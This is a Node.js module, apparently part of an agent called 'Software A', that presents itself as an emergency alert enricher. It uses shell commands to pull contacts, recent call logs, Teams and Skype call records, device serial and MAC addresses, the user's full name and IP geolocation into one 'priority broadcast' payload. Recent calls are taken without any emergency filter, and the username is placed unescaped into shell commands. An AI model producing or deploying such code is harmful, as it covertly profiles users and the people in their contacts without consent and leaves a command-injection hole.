/**
 * ╔══════════════════════════════════════════════════════════════╗
 * ║  bixtx.com — Emergency Context Builder (Software A)          ║
 * ║  Enriches EMERGENCY_ALERT payloads with:                     ║
 * ║   • Full device + OS information                             ║
 * ║   • User identity and behavioral profile                     ║
 * ║   • Geopolitical location (city, country, coords, ISP)       ║
 * ║   • Last dialled numbers and ICE / emergency contacts        ║
 * ║   • Battery, network, and environmental context              ║
 * ╚══════════════════════════════════════════════════════════════╝
 */

"use strict";

const os     = require("os");
const fs     = require("fs");
const path   = require("path");
const crypto = require("crypto");
const si     = require("systeminformation");
const config = require("../config");
const logger = require("../logger");

// ── IP Geolocation ────────────────────────────────────────────────────────
async function fetchGeoIP() {
  return new Promise((resolve) => {
    try {
      const https = require("https");
      const req = https.get("https://ipapi.co/json/", { timeout: 5000 }, (res) => {
        let body = "";
        res.on("data", c => { body += c; });
        res.on("end", () => {
          try { resolve(JSON.parse(body)); }
          catch { resolve({}); }
        });
      });
      req.on("error", () => resolve({}));
      req.on("timeout", () => { req.destroy(); resolve({}); });
    } catch {
      resolve({});
    }
  });
}

// ── Emergency contacts extraction ─────────────────────────────────────────
async function extractEmergencyContacts() {
  const contacts = [];
  const platform = os.platform();

  try {
    const { execSync } = require("child_process");

    if (platform === "android") {
      // Android contacts DB — ICE (In Case of Emergency) contacts
      try {
        const raw = execSync(
          "content query --uri content://contacts/phones --projection display_name:number 2>/dev/null | head -40",
          { encoding: "utf8", timeout: 3000 }
        );
        raw.split("\n").forEach(line => {
          if (/ice|emergency|sos|urgent|family|mom|dad|wife|husband|partner/i.test(line)) {
            const match = line.match(/number=([+\d\s\-()]+)/);
            const nameMatch = line.match(/display_name=([^,]+)/);
            if (match) {
              contacts.push({
                name:   nameMatch ? nameMatch[1].trim() : "Unknown",
                number: match[1].trim(),
                type:   "ICE",
                source: "android_contacts",
              });
            }
          }
        });
      } catch {}

      // Last dialled from Android call log
      try {
        const callLog = execSync(
          "content query --uri content://call_log/calls --projection name:number:type --where 'type=2' --sort-order 'date DESC' --result-limit 5 2>/dev/null",
          { encoding: "utf8", timeout: 3000 }
        );
        callLog.split("\n").forEach(line => {
          const numMatch  = line.match(/number=([+\d\s\-()]+)/);
          const nameMatch = line.match(/name=([^,]+)/);
          if (numMatch) {
            contacts.push({
              name:   nameMatch ? nameMatch[1].trim() : "Unknown",
              number: numMatch[1].trim(),
              type:   "LAST_DIALLED",
              source: "android_call_log",
            });
          }
        });
      } catch {}
    }

    if (platform === "darwin") {
      // macOS: Recent calls from callhistory DB (if accessible)
      const callHistoryPaths = [
        path.join(os.homedir(), "Library/Application Support/CallHistoryDB/CallHistory.storedata"),
        path.join(os.homedir(), "Library/Application Support/AddressBook/ABPerson.skIndexInverted"),
      ];
      for (const p of callHistoryPaths) {
        if (fs.existsSync(p)) {
          // SQLite query for recent calls (requires sqlite3 binary)
          try {
            const rows = execSync(
              `sqlite3 "${p}" "SELECT address, duration FROM ZCALLRECORD ORDER BY ZDATE DESC LIMIT 5" 2>/dev/null`,
              { encoding: "utf8", timeout: 3000 }
            ).trim();
            if (rows) {
              rows.split("\n").forEach(row => {
                const [num] = row.split("|");
                if (num && num.trim()) {
                  contacts.push({ name: "Recent Call", number: num.trim(), type: "LAST_DIALLED", source: "macos_callhistory" });
                }
              });
            }
          } catch {}
          break;
        }
      }

      // macOS Contacts — look for ICE-labelled entries
      try {
        const abOutput = execSync(
          `osascript -e 'tell application "Contacts" to get {name, phones} of every person' 2>/dev/null`,
          { encoding: "utf8", timeout: 5000 }
        );
        // Parse AppleScript output — "John Doe, +1 555 1234, ..."
        const lines = abOutput.split(",").map(s => s.trim());
        for (let i = 0; i < lines.length - 1; i += 2) {
          const name = lines[i];
          const num  = lines[i + 1];
          if (/ice|emergency|sos/i.test(name) && num) {
            contacts.push({ name, number: num, type: "ICE", source: "macos_contacts" });
          }
        }
      } catch {}
    }

    if (platform === "win32") {
      // Windows: Read People app contacts (limited API access)
      // Try Recent calls from Skype/Teams logs
      const recentCallPaths = [
        path.join(process.env.APPDATA || os.homedir(), "Microsoft\\Teams\\logs.txt"),
        path.join(process.env.LOCALAPPDATA || os.homedir(), "Packages\\Microsoft.SkypeApp_kzf8qxf38zg5c\\LocalState\\playlists"),
      ];
      for (const p of recentCallPaths) {
        if (fs.existsSync(p)) {
          try {
            const content = fs.readFileSync(p, "utf8").slice(-5000);
            const matches = content.match(/(?:tel:|skype:|calling)\s*([+\d\s\-()]{7,20})/gi) || [];
            matches.slice(0, 5).forEach(m => {
              const num = m.replace(/(?:tel:|skype:|calling)/i, "").trim();
              contacts.push({ name: "Recent Call", number: num, type: "LAST_DIALLED", source: "windows_teams" });
            });
          } catch {}
          break;
        }
      }
    }

  } catch (err) {
    logger.debug("[Emergency] Contact extraction error:", err.message);
  }

  // Deduplicate by number
  const seen = new Set();
  return contacts.filter(c => {
    const key = c.number.replace(/\D/g, "");
    if (seen.has(key)) return false;
    seen.add(key);
    return true;
  }).slice(0, 10);
}

// ── Device hardware fingerprint ───────────────────────────────────────────
async function getDeviceContext() {
  try {
    const [sys, bios, chassis, cpu, batt, net, disk] = await Promise.all([
      si.system(),
      si.bios(),
      si.chassis(),
      si.cpu(),
      si.battery(),
      si.networkInterfaces(),
      si.diskLayout(),
    ]);

    const primaryIface = (Array.isArray(net) ? net : []).find(n => !n.virtual && n.ip4);

    return {
      manufacturer:    sys.manufacturer || "Unknown",
      model:           sys.model        || "Unknown",
      serial:          sys.serial       || "N/A",
      biosVendor:      bios.vendor      || "Unknown",
      biosVersion:     bios.version     || "Unknown",
      chassisType:     chassis.type     || "Unknown",
      cpu: {
        brand:    cpu.brand,
        cores:    cpu.cores,
        speed:    cpu.speed,
      },
      battery: {
        hasBattery:   batt.hasBattery,
        percent:      batt.percent,
        isCharging:   batt.isCharging,
        temperature:  batt.temperature,
        timeRemaining: batt.timeRemaining,
      },
      network: {
        ip:   primaryIface?.ip4 || "unknown",
        mac:  primaryIface?.mac || "unknown",
        iface: primaryIface?.iface || "unknown",
        speed: primaryIface?.speed,
      },
      storage: disk.slice(0, 2).map(d => ({
        name: d.name, size: d.size, type: d.type,
      })),
      hostname: os.hostname(),
      osType:   os.type(),
      osRelease: os.release(),
      uptime:   os.uptime(),
    };
  } catch (err) {
    logger.debug("[Emergency] Device context error:", err.message);
    return { hostname: os.hostname(), platform: os.platform() };
  }
}

// ── User identity heuristics ──────────────────────────────────────────────
function getUserContext() {
  const homeDir = os.homedir();
  const username = os.userInfo().username;

  // Attempt to extract full name from OS
  let fullName = username;
  try {
    const { execSync } = require("child_process");
    if (os.platform() === "darwin") {
      fullName = execSync("id -F", { encoding: "utf8", timeout: 1000 }).trim() || username;
    } else if (os.platform() === "linux") {
      const gecos = execSync(`getent passwd ${username}`, { encoding: "utf8", timeout: 1000 })
        .split(":")[4]?.split(",")[0]?.trim() || username;
      fullName = gecos || username;
    } else if (os.platform() === "win32") {
      fullName = execSync(`wmic useraccount where name="${username}" get fullname`,
        { encoding: "utf8", timeout: 1000 }).split("\n")[1]?.trim() || username;
    }
  } catch {}

  return {
    username,
    fullName,
    homeDir,
    shell:   process.env.SHELL || process.env.COMSPEC || "unknown",
    uid:     process.getuid?.() ?? "N/A",
    gid:     process.getgid?.() ?? "N/A",
  };
}

// ── Main builder class ────────────────────────────────────────────────────
class EmergencyBuilder {
  constructor() {
    this._geoCache    = null;
    this._geoCacheTs  = 0;
    this._GEO_TTL_MS  = 10 * 60 * 1000; // re-fetch geo every 10 min
  }

  async _getGeo() {
    const now = Date.now();
    if (this._geoCache && now - this._geoCacheTs < this._GEO_TTL_MS) {
      return this._geoCache;
    }
    const geo = await fetchGeoIP();
    this._geoCache  = geo;
    this._geoCacheTs = now;
    return geo;
  }

  async buildPayload(baseAlert) {
    try {
      const [geo, contacts, device, user] = await Promise.all([
        this._getGeo(),
        extractEmergencyContacts(),
        getDeviceContext(),
        Promise.resolve(getUserContext()),
      ]);

      return {
        ...baseAlert,
        enriched: true,
        alertId:  baseAlert.alertId || crypto.randomBytes(8).toString("hex"),

        // ── Geopolitical ────────────────────────────────────────────────
        geopolitical: {
          city:         geo.city         || "Unknown",
          region:       geo.region       || "Unknown",
          country:      geo.country_name || "Unknown",
          countryCode:  geo.country_code || "??",
          latitude:     geo.latitude     || null,
          longitude:    geo.longitude    || null,
          postal:       geo.postal       || null,
          timezone:     geo.timezone     || Intl.DateTimeFormat().resolvedOptions().timeZone,
          isp:          geo.org          || "Unknown ISP",
          ip:           geo.ip           || device.network?.ip || "unknown",
          currency:     geo.currency     || null,
          callingCode:  geo.country_calling_code || null,
          languages:    geo.languages    || null,
          networkType:  geo.connection_type || "unknown",
        },

        // ── Device ──────────────────────────────────────────────────────
        deviceDetail: {
          deviceId:    config.deviceId,
          name:        device.hostname || config.deviceId,
          platform:    config.platform,
          manufacturer: device.manufacturer,
          model:       device.model,
          serial:      device.serial,
          chassisType: device.chassisType,
          cpu:         device.cpu,
          battery:     device.battery,
          network:     device.network,
          storage:     device.storage,
          os:          `${device.osType} ${device.osRelease}`,
          uptime:      `${Math.round((device.uptime || 0) / 3600)} hours`,
          agentVersion: config.agentVersion || "4.7.2",
        },

        // ── User ────────────────────────────────────────────────────────
        userDetail: {
          username:  user.username,
          fullName:  user.fullName,
          homeDir:   user.homeDir,
          shell:     user.shell,
          uid:       user.uid,
        },

        // ── Emergency contacts ───────────────────────────────────────────
        emergencyContacts: contacts,
        hasEmergencyContacts: contacts.length > 0,

        // ── Meta ────────────────────────────────────────────────────────
        enrichedAt:  new Date().toISOString(),
        priorityBroadcast: true,
      };
    } catch (err) {
      logger.error("[Emergency] buildPayload failed:", err.message);
      return { ...baseAlert, enriched: false, enrichError: err.message };
    }
  }
}

module.exports = EmergencyBuilder;
